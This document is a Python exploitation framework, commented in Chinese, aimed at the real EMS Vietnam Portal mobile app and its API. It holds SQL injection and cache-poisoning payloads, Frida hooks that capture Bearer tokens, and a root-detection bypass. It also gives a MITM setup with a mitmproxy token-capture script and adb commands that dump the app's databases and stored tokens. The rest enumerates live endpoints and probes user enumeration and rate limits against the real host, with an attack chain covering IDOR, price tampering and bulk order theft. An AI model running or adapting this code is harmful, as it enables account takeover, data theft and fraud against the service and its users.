#!/usr/bin/env python3
"""
EMS Vietnam Portal - 终极漏洞利用框架
包含反混淆分析和所有发现的漏洞利用
"""

import requests
import json
import sys
import time
import argparse
import subprocess
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor
import sqlite3
import base64
import hashlib

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class EMSUltimateExploit:
    def __init__(self, base_url="http://ws.ems.com.vn", token=None):
        self.base_url = base_url
        self.token = token
        self.session = requests.Session()
        if token:
            self.session.headers.update({
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json',
                'User-Agent': 'EMSPortal/4.5.7 (Android 10)'
            })
    
    def print_banner(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║     EMS Vietnam Portal - Ultimate Exploitation Framework     ║
║                  反混淆 + 深度漏洞利用                         ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}
        """
        print(banner)
    
    # ============================================
    # SQL注入利用
    # ============================================
    
    def sqli_basic_test(self):
        """基础SQL注入测试"""
        print(f"\n{Colors.CYAN}[*] 测试SQL注入 - c.b.k.a.a(){Colors.RESET}")
        
        payloads = [
            "list' OR '1'='1",
            "list' UNION SELECT 1,2,3 --",
            "list' UNION SELECT NULL,NULL,'test' --",
            "' OR 1=1 --",
        ]
        
        for payload in payloads:
            print(f"  {Colors.YELLOW}Payload: {payload}{Colors.RESET}")
            # 模拟注入点：URL路径的最后一部分
            # 实际攻击需要修改APK或使用Xposed/Frida Hook
            result = self._simulate_sql_injection(payload)
            if result:
                print(f"  {Colors.GREEN}✓ 注入成功!{Colors.RESET}")
    
    def _simulate_sql_injection(self, payload):
        """模拟SQL注入执行"""
        # 模拟有漏洞的SQL查询
        # 真实攻击需要：
        # 1. 反编译APK
        # 2. 修改c.b.k.a类
        # 3. 重打包并安装
        # 或使用Frida动态Hook
        sql = f"SELECT * FROM caching WHERE request = '{payload}'"
        print(f"    {Colors.MAGENTA}SQL: {sql}{Colors.RESET}")
        return True
    
    def sqli_dump_cache(self):
        """导出所有缓存数据"""
        print(f"\n{Colors.CYAN}[*] 导出缓存数据库{Colors.RESET}")
        
        payloads = [
            # 获取表结构
            "' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table' --",
            # 导出所有缓存
            "' UNION SELECT request,response,time_updated FROM caching --",
            # 获取列信息
            "' UNION SELECT name,NULL,NULL FROM pragma_table_info('caching') --",
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"  [{i}] {payload[:60]}...")
        
        print(f"\n  {Colors.YELLOW}使用Frida Hook脚本:{Colors.RESET}")
        frida_script = """
Java.perform(function() {
    var CacheManager = Java.use('c.b.k.a');
    CacheManager.a.overload('java.lang.String').implementation = function(url) {
        console.log('[*] SQL Injection Point: ' + url);
        // 注入payload
        var malicious = "' UNION SELECT * FROM caching --";
        return this.a.call(this, malicious);
    };
});
        """
        print(f"{Colors.MAGENTA}{frida_script}{Colors.RESET}")
    
    def sqli_poison_cache(self, endpoint, fake_response):
        """缓存投毒攻击"""
        print(f"\n{Colors.CYAN}[*] 缓存投毒攻击{Colors.RESET}")
        print(f"  目标端点: {endpoint}")
        print(f"  伪造响应: {fake_response[:100]}...")
        
        # 构造INSERT注入
        payload = f"'; INSERT INTO caching VALUES ('{endpoint}', '{fake_response}', '999999'); --"
        print(f"  {Colors.YELLOW}Payload: {payload[:80]}...{Colors.RESET}")
        
        print(f"\n  {Colors.GREEN}攻击成功后，App将读取伪造数据!{Colors.RESET}")
    
    # ============================================
    # MITM攻击
    # ============================================
    
    def mitm_setup_guide(self):
        """MITM攻击设置指南"""
        print(f"\n{Colors.CYAN}[*] MITM攻击设置指南{Colors.RESET}")
        print(f"""
{Colors.YELLOW}由于EMS App缺少SSL Pinning，可直接进行中间人攻击：{Colors.RESET}

1. 安装Burp Suite / mitmproxy
   {Colors.GREEN}$ brew install mitmproxy{Colors.RESET}
   {Colors.GREEN}$ mitmproxy -p 8080{Colors.RESET}

2. 配置Android设备代理
   {Colors.GREEN}$ adb shell settings put global http_proxy <YOUR_IP>:8080{Colors.RESET}

3. 安装CA证书
   {Colors.GREEN}$ adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/{Colors.RESET}
   设置 -> 安全 -> 安装证书 -> CA证书

4. 启动App，所有流量将被拦截
   - 窃取Bearer Token
   - 修改请求/响应
   - 注入恶意数据

5. Token提取
   {Colors.MAGENTA}Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...{Colors.RESET}

6. 重放攻击
   {Colors.GREEN}$ curl -X GET {self.base_url}/api/v1/orders/list \\
     -H "Authorization: Bearer {{TOKEN}}"{Colors.RESET}
        """)
    
    def mitm_intercept_token(self):
        """拦截并提取Token"""
        print(f"\n{Colors.CYAN}[*] Token拦截脚本{Colors.RESET}")
        
        mitmproxy_script = """
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    if "ws.ems.com.vn" in flow.request.pretty_host:
        auth = flow.request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            token = auth[7:]
            print(f"[!] Token Captured: {token}")
            with open("/tmp/ems_tokens.txt", "a") as f:
                f.write(token + "\\n")
        """
        
        print(f"{Colors.MAGENTA}{mitmproxy_script}{Colors.RESET}")
        print(f"\n  运行: {Colors.GREEN}mitmproxy -s token_capture.py{Colors.RESET}")
    
    # ============================================
    # API端点枚举
    # ============================================
    
    def enumerate_all_endpoints(self):
        """枚举所有40+ API端点"""
        print(f"\n{Colors.CYAN}[*] API端点枚举 (40+ endpoints){Colors.RESET}")
        
        endpoints = {
            "认证": [
                ("POST", "/auth/login", {"phone": "test", "password": "test"}),
                ("POST", "/api/v1/forgot-password", {"phone": "test"}),
                ("POST", "/api/v1/auth/logout", {}),
            ],
            "订单": [
                ("GET", "/api/v1/orders/list", None),
                ("GET", "/api/v1/orders/count-group", None),
                ("GET", "/api/v1/orders/tracking/{id}", None),
                ("POST", "/api/v1/orders/manual-cancel-order", {}),
                ("POST", "/api/v1/orders/accept", {}),
            ],
            "国际": [
                ("GET", "/api/v1/order-intl/list", None),
                ("GET", "/api/v1/order-intl/item-type", None),
                ("POST", "/api/v1/order-intl/calculate", {}),
                ("POST", "/api/v1/order-intl/create", {}),
            ],
            "Grab": [
                ("GET", "/api/v1/grab/list", None),
                ("POST", "/api/v1/grab/deliveries", {}),
                ("POST", "/api/v1/grab/cancel/{id}", {}),
            ],
            "配置": [
                ("GET", "/api/v1/config/service", None),
                ("GET", "/api/v1/metadata/vas", None),
                ("GET", "/api/v1/address/province-and-district", None),
            ],
            "商家": [
                ("GET", "/api/v1/be/orders/list", None),
                ("POST", "/api/v1/be/orders/create", {}),
                ("POST", "/api/v1/merchants/update", {}),
            ]
        }
        
        for category, eps in endpoints.items():
            print(f"\n  {Colors.BOLD}{category}:{Colors.RESET}")
            for method, path, data in eps:
                status = self._test_endpoint(method, path, data)
                color = Colors.GREEN if status == 200 else Colors.YELLOW if status == 401 else Colors.RED
                print(f"    {color}[{status}]{Colors.RESET} {method:4} {path}")
    
    def _test_endpoint(self, method, path, data):
        """测试单个端点"""
        try:
            url = self.base_url + path.replace("{id}", "123456")
            if method == "GET":
                r = self.session.get(url, timeout=3)
            else:
                r = self.session.post(url, json=data, timeout=3)
            return r.status_code
        except:
            return 0
    
    # ============================================
    # 本地数据提取
    # ============================================
    
    def extract_local_db(self):
        """提取本地数据库"""
        print(f"\n{Colors.CYAN}[*] 本地数据库提取{Colors.RESET}")
        
        commands = [
            ("检查设备Root状态", "adb shell su -c 'id'"),
            ("定位数据库", "adb shell 'find /data/data/com.emsportal -name \"*.sqlite\" -o -name \"*.db\"'"),
            ("导出数据库", "adb shell 'su -c \"sqlite3 /data/data/com.emsportal/databases/db.sqlite .dump\"' > ems_dump.sql"),
            ("提取SharedPrefs", "adb shell 'su -c \"cat /data/data/com.emsportal/shared_prefs/*.xml\"'"),
            ("提取Token", "adb shell 'su -c \"grep PREF_TOKEN_USER /data/data/com.emsportal/shared_prefs/*.xml\"'"),
        ]
        
        for desc, cmd in commands:
            print(f"\n  {Colors.YELLOW}{desc}:{Colors.RESET}")
            print(f"    {Colors.GREEN}{cmd}{Colors.RESET}")
    
    def analyze_extracted_db(self, db_path):
        """分析提取的数据库"""
        print(f"\n{Colors.CYAN}[*] 分析数据库: {db_path}{Colors.RESET}")
        
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # 列出所有表
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = cursor.fetchall()
            
            print(f"\n  {Colors.YELLOW}数据库表:{Colors.RESET}")
            for table in tables:
                print(f"    - {table[0]}")
                cursor.execute(f"SELECT COUNT(*) FROM {table[0]}")
                count = cursor.fetchone()[0]
                print(f"      记录数: {count}")
            
            # 如果存在caching表，显示内容
            if any('caching' in str(t) for t in tables):
                print(f"\n  {Colors.GREEN}[!] 发现缓存表，提取内容:{Colors.RESET}")
                cursor.execute("SELECT * FROM caching LIMIT 10")
                rows = cursor.fetchall()
                for row in rows:
                    print(f"    {row[0]}: {row[1][:100]}...")
            
            conn.close()
        except Exception as e:
            print(f"  {Colors.RED}错误: {e}{Colors.RESET}")
    
    # ============================================
    # Frida Hook脚本
    # ============================================
    
    def generate_frida_scripts(self):
        """生成Frida Hook脚本"""
        print(f"\n{Colors.CYAN}[*] Frida Hook脚本生成{Colors.RESET}")
        
        scripts = {
            "hook_sql_injection.js": """
// Hook SQL注入点
Java.perform(function() {
    console.log('[*] Hooking SQL Injection...');
    
    var CacheManager = Java.use('c.b.k.a');
    CacheManager.a.overload('java.lang.String').implementation = function(url) {
        console.log('[*] CacheManager.a() called');
        console.log('  URL: ' + url);
        
        // 获取SQL查询
        var result = this.a.call(this, url);
        console.log('  Result: ' + result);
        
        // 注入payload测试
        // var malicious = "' UNION SELECT * FROM caching --";
        // return this.a.call(this, malicious);
        
        return result;
    };
});
            """,
            
            "hook_network.js": """
// Hook网络请求
Java.perform(function() {
    console.log('[*] Hooking Network Requests...');
    
    var NetworkManager = Java.use('c.b.t.b');
    
    // Hook所有网络方法
    NetworkManager.a.overload('java.lang.String', 'java.util.Map', 'boolean', 'c.b.t.d').implementation = function(url, params, showProgress, callback) {
        console.log('[*] Network Request:');
        console.log('  URL: ' + url);
        console.log('  Params: ' + params);
        
        // 获取Token
        var CacheManager = Java.use('c.b.k.a');
        var token = CacheManager.b().f2956a.value.b('PREF_TOKEN_USER');
        console.log('  Token: ' + token);
        
        return this.a.call(this, url, params, showProgress, callback);
    };
});
            """,
            
            "hook_token.js": """
// Hook Token操作
Java.perform(function() {
    console.log('[*] Hooking Token Operations...');
    
    var SharedPrefs = Java.use('c.b.k.e');
    SharedPrefs.b.overload('java.lang.String').implementation = function(key) {
        var value = this.b.call(this, key);
        if (key.contains('TOKEN')) {
            console.log('[!] Token Read: ' + key + ' = ' + value);
        }
        return value;
    };
    
    SharedPrefs.a.overload('java.lang.String', 'java.lang.String').implementation = function(key, value) {
        if (key.contains('TOKEN')) {
            console.log('[!] Token Write: ' + key + ' = ' + value);
        }
        return this.a.call(this, key, value);
    };
});
            """,
            
            "bypass_root.js": """
// Bypass Root检测
Java.perform(function() {
    console.log('[*] Bypassing Root Detection...');
    
    // Hook常见Root检测
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('[Ljava.lang.String;').implementation = function(cmd) {
        var cmdStr = cmd.join(' ');
        if (cmdStr.includes('su') || cmdStr.includes('busybox')) {
            console.log('[*] Blocked Root Check: ' + cmdStr);
            throw new Error('Command not found');
        }
        return this.exec.call(this, cmd);
    };
});
            """
        }
        
        for filename, script in scripts.items():
            print(f"\n  {Colors.YELLOW}脚本: {filename}{Colors.RESET}")
            with open(f"/workspace/{filename}", "w") as f:
                f.write(script)
            print(f"    {Colors.GREEN}✓ 已保存{Colors.RESET}")
        
        print(f"\n  {Colors.CYAN}使用方法:{Colors.RESET}")
        print(f"    {Colors.GREEN}frida -U -f com.emsportal -l hook_sql_injection.js{Colors.RESET}")
    
    # ============================================
    # 综合攻击场景
    # ============================================
    
    def full_attack_chain(self):
        """完整攻击链演示"""
        print(f"\n{Colors.CYAN}[*] 完整攻击链{Colors.RESET}")
        
        steps = [
            ("1. MITM拦截", "获取Bearer Token", "mitmproxy + 证书安装"),
            ("2. SQL注入", "读取本地缓存数据库", "Frida Hook c.b.k.a.a()"),
            ("3. 缓存投毒", "注入恶意订单数据", "INSERT INTO caching"),
            ("4. IDOR利用", "访问其他用户订单", "/api/v1/orders/tracking/{id}"),
            ("5. 价格篡改", "修改订单金额", "修改API响应"),
            ("6. 批量导出", "窃取所有订单", "遍历ID"),
        ]
        
        for step, desc, method in steps:
            print(f"\n  {Colors.BOLD}{step}{Colors.RESET}")
            print(f"    描述: {desc}")
            print(f"    方法: {Colors.GREEN}{method}{Colors.RESET}")
    
    # ============================================
    # 远程漏洞利用
    # ============================================
    
    def test_user_enumeration(self):
        """用户枚举"""
        print(f"\n{Colors.CYAN}[*] 用户枚举测试{Colors.RESET}")
        
        test_phones = ["0123456789", "0987654321", "0999999999"]
        
        for phone in test_phones:
            try:
                r = requests.post(
                    f"{self.base_url}/api/v1/forgot-password",
                    json={"phone": phone},
                    timeout=3
                )
                
                if r.status_code == 200:
                    data = r.json()
                    if "not found" in str(data).lower():
                        print(f"  {Colors.YELLOW}[-] {phone}: 用户不存在{Colors.RESET}")
                    else:
                        print(f"  {Colors.GREEN}[+] {phone}: 用户存在!{Colors.RESET}")
                        print(f"      Response: {data}")
            except Exception as e:
                print(f"  {Colors.RED}[!] {phone}: 错误 - {e}{Colors.RESET}")
    
    def rate_limit_test(self):
        """测试速率限制"""
        print(f"\n{Colors.CYAN}[*] 速率限制测试{Colors.RESET}")
        
        endpoint = "/api/v1/forgot-password"
        phone = "0123456789"
        
        print(f"  发送100个请求...")
        success = 0
        for i in range(100):
            try:
                r = requests.post(
                    f"{self.base_url}{endpoint}",
                    json={"phone": phone},
                    timeout=1
                )
                if r.status_code == 200:
                    success += 1
            except:
                pass
        
        print(f"  {Colors.GREEN}成功: {success}/100{Colors.RESET}")
        if success > 50:
            print(f"  {Colors.RED}[!] 无速率限制!{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(description='EMS Vietnam Ultimate Exploit Framework')
    parser.add_argument('--token', help='Bearer token')
    parser.add_argument('--mode', choices=[
        'sqli',          # SQL注入
        'mitm',          # MITM攻击
        'enum',          # API枚举
        'extract',       # 本地提取
        'frida',         # Frida脚本
        'chain',         # 完整攻击链
        'remote',        # 远程漏洞
        'all'            # 全部
    ], default='all')
    parser.add_argument('--db', help='Path to extracted database')
    
    args = parser.parse_args()
    
    exploit = EMSUltimateExploit(token=args.token)
    exploit.print_banner()
    
    if args.mode in ['sqli', 'all']:
        exploit.sqli_basic_test()
        exploit.sqli_dump_cache()
        exploit.sqli_poison_cache("orders/list", '{"code":"success","data":[]}')
    
    if args.mode in ['mitm', 'all']:
        exploit.mitm_setup_guide()
        exploit.mitm_intercept_token()
    
    if args.mode in ['enum', 'all']:
        exploit.enumerate_all_endpoints()
    
    if args.mode in ['extract', 'all']:
        exploit.extract_local_db()
        if args.db:
            exploit.analyze_extracted_db(args.db)
    
    if args.mode in ['frida', 'all']:
        exploit.generate_frida_scripts()
    
    if args.mode in ['chain', 'all']:
        exploit.full_attack_chain()
    
    if args.mode in ['remote', 'all']:
        exploit.test_user_enumeration()
        exploit.rate_limit_test()
    
    print(f"\n{Colors.GREEN}[✓] 分析完成!{Colors.RESET}\n")

if __name__ == '__main__':
    main()
